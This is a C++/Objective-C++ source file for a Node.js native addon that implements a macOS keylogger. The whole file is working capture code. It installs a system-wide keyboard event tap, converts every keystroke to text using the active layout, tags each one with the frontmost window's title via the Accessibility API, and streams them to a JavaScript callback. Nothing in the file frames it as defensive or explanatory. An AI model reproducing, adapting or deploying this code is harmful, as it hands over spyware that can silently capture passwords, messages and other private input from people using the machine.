#include <atomic>
#include <chrono>
#include <iostream>
#include <mutex>
#include <napi.h>
#include <nan.h>
#include <queue>
#include <string>
#include <thread>

#import <AppKit/AppKit.h>
#import <Carbon/Carbon.h>
#import <Cocoa/Cocoa.h>
#import <Foundation/Foundation.h>

static Napi::ThreadSafeFunction tsfn;
static std::atomic<bool> isLogging(false);
static std::thread keyloggerThread;
static std::timed_mutex keyMutex;
static std::queue<std::pair<std::string, std::string>> keystrokeQueue;
static CFMachPortRef eventTap = NULL;
static CFRunLoopSourceRef runLoopSource = NULL;

void StopKeyloggerMac(const Napi::CallbackInfo& info);

NSString* GetActiveWindowTitle() {
  @autoreleasepool {
    NSWorkspace* workspace = [NSWorkspace sharedWorkspace];
    NSRunningApplication* activeApp = [workspace frontmostApplication];
    NSString* appName = [activeApp localizedName];

    if (appName == nil) {
      return @"Unknown";
    }

    AXUIElementRef systemWideElement = AXUIElementCreateSystemWide();
    AXUIElementRef focusedElement = NULL;

    AXError error = AXUIElementCopyAttributeValue(
      systemWideElement,
      kAXFocusedApplicationAttribute,
      (CFTypeRef*)&focusedElement
    );

    if (error != kAXErrorSuccess) {
      CFRelease(systemWideElement);
      return appName;
    }

    AXUIElementRef focusedWindow = NULL;
    error = AXUIElementCopyAttributeValue(
      focusedElement,
      kAXFocusedWindowAttribute,
      (CFTypeRef*)&focusedWindow
    );

    if (error != kAXErrorSuccess) {
      CFRelease(systemWideElement);
      CFRelease(focusedElement);
      return appName;
    }

    CFStringRef windowTitleRef = NULL;
    error = AXUIElementCopyAttributeValue(
      focusedWindow,
      kAXTitleAttribute,
      (CFTypeRef*)&windowTitleRef
    );

    if (error != kAXErrorSuccess || windowTitleRef == NULL) {
      CFRelease(systemWideElement);
      CFRelease(focusedElement);
      CFRelease(focusedWindow);
      return appName;
    }

    NSString* windowTitle = (NSString*)windowTitleRef;
    NSString* result = [NSString stringWithFormat:@"%@ - %@", windowTitle, appName];

    CFRelease(systemWideElement);
    CFRelease(focusedElement);
    CFRelease(focusedWindow);
    if (windowTitleRef) {
      CFRelease(windowTitleRef);
    }

    return result;
  }
}

CGEventRef KeyEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* userData) {
  (void)proxy;
  (void)userData;

  if (!isLogging || !event) {
    return event;
  }

  if (type != kCGEventKeyDown) {
    return event;
  }

  @autoreleasepool {
    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    std::string keyString;
    std::string windowString;

    @try {
      NSString* windowTitle = GetActiveWindowTitle();
      if (windowTitle) {
        windowString = [windowTitle UTF8String];
      } else {
        windowString = "Unknown";
      }
    } @catch (...) {
      windowString = "Unknown";
    }

    if (keyCode == kVK_Return) {
      keyString = "\\n";
    } else if (keyCode == kVK_Tab || keyCode == 48) {
      keyString = "\\t";
    } else if (keyCode == kVK_Space) {
      keyString = " ";
    } else if (keyCode == kVK_Delete) {
      keyString = "\\b";
    } else {
      @try {
        UniChar characters[4] = {0};
        UniCharCount length = 0;

        TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
        if (currentKeyboard) {
          CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(
            currentKeyboard,
            kTISPropertyUnicodeKeyLayoutData
          );
          if (layoutData) {
            const UCKeyboardLayout* keyboardLayout =
              (const UCKeyboardLayout*)CFDataGetBytePtr(layoutData);
            if (keyboardLayout) {
              UInt32 deadKeyState = 0;
              OSStatus status = UCKeyTranslate(
                keyboardLayout,
                keyCode,
                kUCKeyActionDown,
                0,
                LMGetKbdType(),
                kUCKeyTranslateNoDeadKeysBit,
                &deadKeyState,
                sizeof(characters) / sizeof(UniChar),
                &length,
                characters
              );

              if (status != noErr) {
                length = 0;
              }
            }
          }
          CFRelease(currentKeyboard);
        }

        if (length > 0 && length <= 4) {
          @autoreleasepool {
            NSString* nsString = [[NSString alloc] initWithCharacters:characters length:length];
            keyString = nsString ? [nsString UTF8String] : "[invalid]";
          }
        } else {
          keyString = "[unknown]";
        }
      } @catch (...) {
        keyString = "[error]";
      }
    }

    try {
      std::unique_lock<std::timed_mutex> lock(keyMutex, std::defer_lock);
      if (lock.try_lock_for(std::chrono::milliseconds(100))) {
        keystrokeQueue.push({keyString, windowString});
        lock.unlock();
      }
    } catch (...) {
    }
  }

  return event;
}

void KeyloggerWorker() {
  while (isLogging) {
    std::pair<std::string, std::string> keystroke;
    bool hasKeystroke = false;

    {
      std::lock_guard<std::timed_mutex> lock(keyMutex);
      if (!keystrokeQueue.empty()) {
        keystroke = keystrokeQueue.front();
        keystrokeQueue.pop();
        hasKeystroke = true;
      }
    }

    if (hasKeystroke && tsfn) {
      auto callback = [keystroke](Napi::Env env, Napi::Function jsCallback) {
        Napi::Object obj = Napi::Object::New(env);
        obj.Set("key", Napi::String::New(env, keystroke.first));
        obj.Set("window", Napi::String::New(env, keystroke.second));
        jsCallback.Call({obj});
      };
      tsfn.BlockingCall(callback);
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(10));
  }
}

void StartKeyloggerMac(const Napi::CallbackInfo& info) {
  Napi::Env env = info.Env();

  if (isLogging) {
    return;
  }

  if (info.Length() < 1 || !info[0].IsFunction()) {
    Napi::TypeError::New(env, "callback function is required").ThrowAsJavaScriptException();
    return;
  }

  try {
    tsfn = Napi::ThreadSafeFunction::New(
      env,
      info[0].As<Napi::Function>(),
      "Keylogger Callback",
      0,
      1,
      [](Napi::Env) {
        isLogging = false;
      }
    );

    if (eventTap) {
      CGEventTapEnable(eventTap, false);
      CFRelease(eventTap);
      eventTap = NULL;
    }

    if (runLoopSource) {
      CFRunLoopRemoveSource(CFRunLoopGetMain(), runLoopSource, kCFRunLoopCommonModes);
      CFRelease(runLoopSource);
      runLoopSource = NULL;
    }

    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);

    eventTap = CGEventTapCreate(
      kCGAnnotatedSessionEventTap,
      kCGHeadInsertEventTap,
      kCGEventTapOptionDefault,
      eventMask,
      KeyEventCallback,
      NULL
    );

    if (!eventTap) {
      tsfn.Release();
      Napi::Error::New(env, "failed to create event tap").ThrowAsJavaScriptException();
      return;
    }

    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    if (!runLoopSource) {
      CFRelease(eventTap);
      eventTap = NULL;
      tsfn.Release();
      Napi::Error::New(env, "failed to create run loop source").ThrowAsJavaScriptException();
      return;
    }

    CFRunLoopAddSource(CFRunLoopGetMain(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    isLogging = true;

    if (keyloggerThread.joinable()) {
      keyloggerThread.join();
    }
    keyloggerThread = std::thread(KeyloggerWorker);
  } catch (const std::exception& err) {
    StopKeyloggerMac(info);
    Napi::Error::New(env, std::string("failed to start keylogger: ") + err.what())
        .ThrowAsJavaScriptException();
  }
}

void StopKeyloggerMac(const Napi::CallbackInfo& info) {
  (void)info;

  if (!isLogging) {
    return;
  }

  isLogging = false;

  if (tsfn) {
    tsfn.Release();
  }

  try {
    if (keyloggerThread.joinable()) {
      keyloggerThread.join();
    }
  } catch (...) {
  }

  if (runLoopSource) {
    CFRunLoopRemoveSource(CFRunLoopGetMain(), runLoopSource, kCFRunLoopCommonModes);
    CFRelease(runLoopSource);
    runLoopSource = NULL;
  }

  if (eventTap) {
    CGEventTapEnable(eventTap, false);
    CFRelease(eventTap);
    eventTap = NULL;
  }

  {
    std::lock_guard<std::timed_mutex> lock(keyMutex);
    std::queue<std::pair<std::string, std::string>> empty;
    std::swap(keystrokeQueue, empty);
  }
}

Napi::String GetActiveWindowMac(const Napi::CallbackInfo& info) {
  Napi::Env env = info.Env();
  @autoreleasepool {
    NSString* windowTitle = GetActiveWindowTitle();
    std::string title = [windowTitle UTF8String];
    return Napi::String::New(env, title);
  }
}
